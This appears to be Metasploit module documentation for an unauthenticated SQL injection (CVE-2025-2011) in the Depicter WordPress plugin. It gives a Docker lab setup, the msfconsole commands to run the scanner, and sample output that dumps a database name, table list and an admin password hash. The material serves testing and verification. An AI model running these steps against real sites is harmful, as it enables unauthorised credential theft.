## Vulnerable Application

The vulnerability affects the **Slider & Popup Builder by Depicter** plugin for WordPress,
versions **up to 3.6.1**, allowing **unauthenticated SQL injection** via the `s` parameter on `admin-ajax.php`.
WordPress itself must be installed.

### Pre-requisites

* **Docker** and **Docker Compose** installed.


## Setup Instructions

1. **Create a `docker-compose.yml`** with:

```yaml
version: '3.1'

   services:
     wordpress:
       image: wordpress:latest
       restart: always
       ports:
         - 5555:80
       environment:
         WORDPRESS_DB_HOST: db
         WORDPRESS_DB_USER: chocapikk
         WORDPRESS_DB_PASSWORD: dummy_password
         WORDPRESS_DB_NAME: exploit_market
       mem_limit: 512m
       volumes:
         - wordpress:/var/www/html

     db:
       image: mysql:5.7
       restart: always
       environment:
         MYSQL_DATABASE: exploit_market
         MYSQL_USER: chocapikk
         MYSQL_PASSWORD: dummy_password
         MYSQL_RANDOM_ROOT_PASSWORD: '1'
       volumes:
         - db:/var/lib/mysql

   volumes:
     wordpress:
     db:
```

2. **Start the environment**

```bash
docker-compose up -d
```

3. **Install Depicter plugin**

```bash
wget https://downloads.wordpress.org/plugin/depicter.3.6.1.zip
unzip depicter.3.6.1.zip
docker cp depicter wordpress:/var/www/html/wp-content/plugins/
```

4. **Activate Depicter**

* Browse to `http://localhost:5555/wp-admin`, log in as admin (create one if needed), and activate **Slider & Popup Builder by Depicter**.
* No additional setup is required.


## Verification Steps

1. **Launch Metasploit**

```bash
msfconsole
```

2. **Load the Depicter SQLi scanner**

```bash
use auxiliary/gather/wp_depicter_sqli_cve_2025_2011
set RHOSTS 127.0.0.1
set RPORT 5555
set TARGETURI /
```

3. **Run the module**

```bash
run
```

4. **Observe output**

The module should:

* Retrieve the database name
* Enumerate tables and infer the `wp_users` table
* Extract `user_login:user_pass` for the number of rows set by `COUNT`

## Options

* **TARGETURI** (`/`): base path to WordPress
* **COUNT** (`1`): number of user rows to retrieve

## Scenarios

```bash
msf6 auxiliary(gather/wp_depicter_sqli_cve_2025_2011) > run http://lab:5555
[*] Retrieving database name via SQLi...
[+] Database name: exploit_market
[*] Enumerating tables for prefix inference...
[+] Tables: wp_commentmeta,wp_comments,wp_depicter_documents,wp_depicter_lead_fields,wp_depicter_leads,wp_depicter_meta,wp_depicter_options,wp_links,wp_options,wp_postmeta,wp_posts,wp_suretriggers_webhook_requests,wp_term_relationships,wp_term_taxonomy,wp_termmeta,wp_terms,wp_ur_membership_ordermeta,wp_ur_membership_orders,wp_ur_membership_subscriptio
[*] Inferred users table: wp_users
[*] Extracting user credentials...
[!] No active DB -- Credential data will not be saved!
[+] Created credential for chocapikk
wp_users
========

    Username   Password Hash
    --------   -------------
    chocapikk  $wp$2y$10$rc5oXfNPG.bYSnbYvELKZeGgoQ9.QHcAXG8U/xunfXzsviMQkiPga

[+] Loot saved to: /home/chocapikk/.msf4/loot/20250514154441_default_127.0.0.1_wordpress.users_167822.txt
[+] Reporting completed
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
